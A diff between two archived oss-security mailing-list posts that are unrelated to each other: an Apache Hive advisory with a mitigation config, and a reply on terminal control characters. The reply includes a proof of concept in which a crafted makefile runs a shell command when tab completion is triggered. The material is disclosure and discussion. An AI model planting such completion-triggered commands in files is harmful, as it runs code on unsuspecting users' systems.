@@ -1,46 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/11/08/2
-Message-ID: <CABDpyCjx+GpPvEW1mreZPnqCmqBYmAVk3s5NUx4ZGnQKcj7aGg@mail.gmail.com>
-Date: Wed, 7 Nov 2018 13:29:04 -0800
-From: Daniel Dai <daijy@...che.org>
-To: user@...e.apache.org, dev@...e.apache.org, announce@...che.org,  security <security@...e.apache.org>, oss-security@...ts.openwall.com,  Mithun Radhakrishnan <mithunr@...h.com>
-Subject: [SECURITY] CVE-2018-11777: Blocking local resource access in HiveServer2
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/04/16/1
+Message-ID: <20180416081500.4dnup7bk3g6vkkaa@jwilk.net>
+Date: Mon, 16 Apr 2018 10:15:00 +0200
+From: Jakub Wilk <jwilk@...lk.net>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: Terminal Control Chars
 Content-Type: text/plain; charset=utf-8
 
-CVE-2018-11777: Blocking local resource access in HiveServer2
+* David A. Wheeler <dwheeler@...eeler.com>, 2018-04-12, 17:18:
+>Russ Allbery:
+>>I think a useful definition of "control character" in this context 
+>>(and I realize this doesn't exactly match the ASCII definition) is a 
+>>character that results in an action other than insertion being 
+>>taken... CR and LF would not be control characters in that definition, 
+>>since they insert a newline and don't cause an action. Similarly, TAB 
+>>wouldn't be a control character in that definition.
+>
+>As you noted, that definition doesn't match the ASCII definition, but I 
+>also think it's misleading.  If someone pastes a CR/LF into a shell 
+>prompt, it certainly *DOES* cause an action,
 
-Severity: Important
+Similarly, tab is an "active" character in most shells.
 
-Vendor: The Apache Software Foundation
+In the worst case (the victim uses bash with bash-completion installed, 
+and the attacker has write access to the victim's filesystem), pasting 
+tab can be as bad as pasting LF.
 
-Versions Affected: This vulnerability affects all versions of Hive,
-including 2.3.3, 3.1.0 and earlier
+Here's a proof of concept:
 
-Description: Local resources on HiveServer2 machines are not properly
-protected against malicious user if ranger, sentry or sql standard
-authorizer is not in use.
+   $ printf 'x := $(shell (echo; cowsay pwned)>/dev/tty)' > moo
+   $ make -f moo <tab>
+    _______
+   < pwned >
+    -------
+           \   ^__^
+            \  (oo)\_______
+               (__)\       )\/\
+                   ||----w |
+                   ||     ||
 
-Mitigation: It is recommended to upgrade to 2.3.4 or 3.1.1 or later if
-HiveServer2 is used, and ranger, sentry or sql standard authorizer
-is not in use. Admin needs to specify the following entries in
-hiveserver2-site.xml:
+Credit for discovering this goes to Dan Rosenberg:
+https://twitter.com/djrbliss/status/699363006946344963
 
-<property>
-  <name>hive.security.authorization.enabled</name>
-  <value>true</value>
-</property>
-<property>
-  <name>hive.security.authorization.manager</name>
-  <value>org.apache.hadoop.hive.ql.security.authorization.plugin.fallback.FallbackHiveAuthorizerFactory</value>
-</property>
-
-FallbackHiveAuthorizerFactory will do the following to mitigate above
-mentioned threat:
-1. Disallow local file location in sql statements except for admin
-2. Allow "set" only selected whitelist parameters
-3. Disallow dfs commands except for admin
-4. Disallow "ADD JAR" statement
-5. Disallow "COMPILE" statement
-6. Disallow "TRANSFORM" statement
-
-Credit: This issue was discovered by Mithun Radhakrishnan of Oath Inc
+-- 
+Jakub Wilk
